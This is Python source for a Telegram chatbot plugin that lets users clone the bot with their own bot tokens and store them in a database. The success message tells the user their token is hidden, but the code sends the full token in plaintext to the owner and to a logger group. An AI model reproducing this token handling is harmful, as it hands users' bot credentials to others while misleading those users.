import logging
import os
import sys
import shutil
import asyncio
from pyrogram.enums import ParseMode
from pyrogram import Client, filters
from pyrogram.errors import AccessTokenExpired, AccessTokenInvalid
import config
from pyrogram.types import BotCommand
from config import API_HASH, API_ID, OWNER_ID, LOGGER_GROUP
from PRITI_CHATBOT import PRITI_CHATBOT as app, save_clonebot_owner
from PRITI_CHATBOT import db as mongodb

CLONES = set()
clonebotdb = mongodb.clonebotdb


# ==================================================================
#                         CLONE COMMAND
# ==================================================================
@app.on_message(filters.command(["clone", "host", "deploy"]))
async def clone_txt(client, message):

    if len(message.command) <= 1:
        return await message.reply_text("Send bot token:\n`/clone 123:ABCDEF`")

    bot_token = message.text.split("/clone", 1)[1].strip()
    mi = await message.reply_text("Checking bot token…")

    user_id = message.from_user.id

    # USER LIMIT
    if user_id != int(OWNER_ID):
        exist = await clonebotdb.find_one({"user_id": user_id})
        if exist:
            return await mi.edit_text(
                f"⚠️ You already cloned @{exist['username']}\n"
                f"Remove: `/delclone {exist['token']}`"
            )

    # CHECK BOT TOKEN
    try:
        ai = Client(bot_token, API_ID, API_HASH,
                    bot_token=bot_token,
                    plugins=dict(root="PRITI_CHATBOT/mplugin"))
        await ai.start()
        bot = await ai.get_me()

        await save_clonebot_owner(bot.id, user_id)

        await ai.set_bot_commands([
            BotCommand("start", "Start the bot"),
            BotCommand("help", "Show help"),
            BotCommand("clone", "Clone chat bot"),
            BotCommand("ping", "Check alive"),
            BotCommand("lang", "Select language"),
            BotCommand("chatlang", "Current language"),
            BotCommand("resetlang", "Reset language"),
            BotCommand("id", "Get your ID"),
            BotCommand("stats", "Show bot stats"),
            BotCommand("gcast", "Broadcast message"),
            BotCommand("chatbot", "AI On/Off"),
            BotCommand("status", "Chatbot status"),
            BotCommand("shayri", "Random shayri"),
            BotCommand("ask", "Ask ChatGPT"),
            BotCommand("repo", "Bot source code"),
        ])

    except (AccessTokenExpired, AccessTokenInvalid):
        return await mi.edit_text("❌ Invalid Bot Token")

    except Exception:
        existing = await clonebotdb.find_one({"token": bot_token})
        if existing:
            return await mi.edit_text("🤖 Bot already cloned!")
        return await mi.edit_text("❌ Error starting bot.")

    await mi.edit_text("Cloning process started…")

    # ==================================================================
    #                        SAVE CLONED BOT
    # ==================================================================
    try:
        details = {
            "bot_id": bot.id,
            "is_bot": True,
            "user_id": user_id,
            "name": bot.first_name,
            "token": bot_token,
            "username": bot.username,
        }

        await clonebotdb.insert_one(details)
        CLONES.add(bot.id)

        # Mention
        mention = f"[{message.from_user.first_name}](tg://user?id={user_id})"

        # USER MESSAGE
        user_details = (
            "✨ **Clone Successful!**\n\n"
            "**👤 User Details:**\n"
            f"• Name: {mention}\n"
            f"• ID: `{user_id}`\n"
            f"• Username: @{message.from_user.username}\n\n"

            "**🤖 Bot Details:**\n"
            f"• Name: {bot.first_name}\n"
            f"• Username: @{bot.username}\n"
            f"• Bot ID: `{bot.id}`\n"
            "• Status: `Running ✓`\n\n"

            "**🔐 Token (Hidden):**\n"
            f"`{bot_token[:10]}*************************`\n\n"

            f"Thank you {mention} ❤️\n"
            "Check clone: `/cloned`\n"
            f"Delete clone: `/delclone {bot_token}`"
        )

        await message.reply_text(user_details, parse_mode="Markdown")

        # OWNER LOG
        owner_log = (
            "🆕 **New Clone Created**\n\n"
            f"👤 User: {mention} (`{user_id}`)\n"
            f"🤖 Bot: @{bot.username}\n"
            f"🆔 Bot ID: `{bot.id}`\n"
            f"🔑 Token: `{bot_token}`"
        )

        await app.send_message(int(OWNER_ID), owner_log, parse_mode="Markdown")

        # LOGGER GROUP
        try:
            logger_msg = (
                "📢 **Clone Log**\n\n"
                f"User: {mention}\n"
                f"Bot: @{bot.username}\n"
                f"Bot ID: `{bot.id}`\n"
                f"Token: `{bot_token}`"
            )
            await app.send_message(LOGGER_GROUP, logger_msg, parse_mode="Markdown")
        except:
            pass

    except Exception as e:
        logging.exception(e)
        return await mi.edit_text(f"Error:\n`{e}`")



# ==================================================================
#                        SHOW CLONED BOTS
# ==================================================================
@app.on_message(filters.command("cloned"))
async def list_cloned_bots(client, message):
    user_id = message.from_user.id

    # OWNER SEES ALL
    if user_id == int(OWNER_ID):
        bots = await clonebotdb.find().to_list(None)
        if not bots:
            return await message.reply_text("No bots cloned.")

        text = f"👑 **Total Clones: {len(bots)}**\n\n"
        for b in bots:
            text += (
                f"🤖 @{b['username']}\n"
                f"• Name: {b['name']}\n"
                f"• Bot ID: `{b['bot_id']}`\n"
                f"• Owner ID: `{b['user_id']}`\n\n"
            )
        return await message.reply_text(text)

    # USER SEES ONLY THEIR BOT
    mine = await clonebotdb.find_one({"user_id": user_id})
    if not mine:
        return await message.reply_text("❌ You have no cloned bot.")

    return await message.reply_text(
        f"🤖 **Your Clone:**\n"
        f"• @{mine['username']}\n"
        f"• Name: {mine['name']}\n"
        f"• Bot ID: `{mine['bot_id']}`"
    )



# ==================================================================
#                       DELETE CLONED BOT
# ==================================================================
@app.on_message(filters.command(["delclone", "deleteclone", "removeclone"]))
async def delete_cloned_bot(client, message):

    if len(message.command) < 2:
        return await message.reply_text("Usage:\n`/delclone <BOT_TOKEN>`")

    token = message.command[1]
    user_id = message.from_user.id

    bot = await clonebotdb.find_one({"token": token})
    if not bot:
        return await message.reply_text("❌ Invalid token.")

    # USER CAN DELETE ONLY THEIR BOT
    if user_id != int(OWNER_ID) and bot["user_id"] != user_id:
        return await message.reply_text("⚠️ You can delete only your bot!")

    await clonebotdb.delete_one({"token": token})

    try:
        CLONES.remove(bot["bot_id"])
    except:
        pass

    await message.reply_text("🗑 Bot clone removed.\nRevoke token from @BotFather.")



# ==================================================================
#                 OWNER DELETE ALL CLONES
# ==================================================================
@app.on_message(filters.command("delallclone") & filters.user(int(OWNER_ID)))
async def delete_all_cloned_bots(client, message):
    await clonebotdb.delete_many({})
    CLONES.clear()
    await message.reply_text("🧹 All cloned bots deleted.")
    os.system(f"kill -9 {os.getpid()} && bash start")